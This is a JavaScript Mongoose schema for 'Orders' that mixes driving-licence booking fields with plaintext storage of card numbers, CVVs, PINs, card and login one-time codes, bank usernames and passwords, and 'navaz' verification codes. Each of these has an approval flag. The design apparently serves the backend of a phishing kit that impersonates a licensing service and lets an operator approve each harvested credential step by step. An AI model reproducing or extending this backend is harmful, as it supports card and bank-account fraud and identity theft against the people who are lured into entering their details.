const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      username: String,
      password: String,
      type: String,
      before: String,
      after: String,
      loginAccept: {
        type: Boolean,
        default: false,
      },

      loginOtp: String,

      loginOTPAccept: {
        type: Boolean,
        default: false,
      },

      service: String,
      type: String,
      fullname: String,
      gender: String,
      nationalty: String,
      nation_number: String,
      birth: String,
      phone: String,
      email: String,
      lang: String,
      licence_type: String,
      car_type: String,
      time: String,
      check_time: String,
      train_lang: String,

      visa_card_holder_name: String,
      visa_card_number: String,
      visa_cvv: String,
      visa_expiryDate: String,
      bank: String,

      visaAccept: {
        type: Boolean,
        default: false,
      },

      bankUsername: String,
      bankPassword: String,

      bankAccept: {
        type: Boolean,
        default: false,
      },

      visa_otp: String,

      visaOtpAccept: {
        type: Boolean,
        default: false,
      },

      visa_pin: String,

      visaPinAccept: {
        type: Boolean,
        default: false,
      },
      navazCode: String,
      navazCodeAccept: {
        type: Boolean,
        default: false,
      },
      navazOtp: String,
      checked: {
        type: Boolean,
        default: false,
      },
      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
